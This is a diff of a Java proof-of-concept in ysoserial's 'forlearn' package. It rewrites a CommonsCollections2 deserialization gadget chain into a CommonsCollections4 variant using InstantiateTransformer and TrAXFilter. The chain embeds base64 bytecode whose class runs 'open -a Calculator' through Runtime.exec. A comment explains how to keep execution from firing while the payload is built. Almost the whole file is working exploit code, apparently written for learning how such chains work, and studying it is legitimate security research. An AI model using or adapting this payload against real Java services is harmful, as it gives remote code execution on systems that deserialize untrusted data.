@@ -1,13 +1,15 @@
 package ysoserial.payloads.forlearn;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
 
+import javax.xml.transform.Templates;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectInputStream;
@@ -17,7 +19,7 @@ import java.util.Base64;
 import java.util.PriorityQueue;
 
 
-public class CommonsCollections2_Simple_WithoutTransformerArray {
+public class CommonsCollections4_Simple_InstantiateTransformer_WithoutArray {
 
     private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
@@ -25,16 +27,10 @@ public class CommonsCollections2_Simple_WithoutTransformerArray {
         field.set(obj, fieldValue);
     }
 
-    private static Object getFiledValue(Object obj, String fieldName) throws Exception {
-        Field field = obj.getClass().getDeclaredField(fieldName);
-        field.setAccessible(true);
-        return field.get(obj);
-    }
-
     public static void main(String[] args) {
         try {
             byte[] codes = Base64.getDecoder().decode("yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1FeHBsb2l0Mi5qYXZhDAAJAAoHACEMACIAIwEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAJAAlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAJgAKAQAIRXhwbG9pdDIBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAAIAAQACwANABEAEAAPABEAEAAVABIADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAARAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAAYABIAAAAEAAEAEwABABAAFAACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAHQASAAAABAABABMAAQAVAAAAAgAW");
-            byte[][] _bytecodes = new byte[][] {
+            byte[][] _bytecodes = new byte[][]{
                 codes,
             };
             TemplatesImpl templatesObj = new TemplatesImpl();
@@ -42,11 +38,12 @@ public class CommonsCollections2_Simple_WithoutTransformerArray {
             setFiledValue(templatesObj, "_name", "whatever");
             setFiledValue(templatesObj, "_tfactory", new TransformerFactoryImpl());
 
-            InvokerTransformer evilTransformer = new InvokerTransformer(
-                "newTransformer", new Class[0], new Object[0]);
+            Transformer transformer = new InstantiateTransformer(
+                new Class[]{Templates.class},
+                new Object[]{templatesObj}
+            );
 
-            Transformer tmpTransformer = new InvokerTransformer(
-                "toString", new Class[0], new Object[0]);
+            Transformer tmpTransformer = new ConstantTransformer(1);
 
             /**
              * 因为PriorityQueue#add()操作也会触发比较器的比较操作：
@@ -54,13 +51,12 @@ public class CommonsCollections2_Simple_WithoutTransformerArray {
              *
              * 所以为了避免生成序列化数据的过程中触发命令执行，先构造一个无害的Transformer
              */
-
             TransformingComparator comparator = new TransformingComparator(tmpTransformer);
             PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-            queue.add(templatesObj);
-            queue.add(templatesObj);
+            queue.add(TrAXFilter.class);
+            queue.add(TrAXFilter.class);
 
-            setFiledValue(comparator, "transformer", evilTransformer);
+            setFiledValue(comparator, "transformer", transformer);
 
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
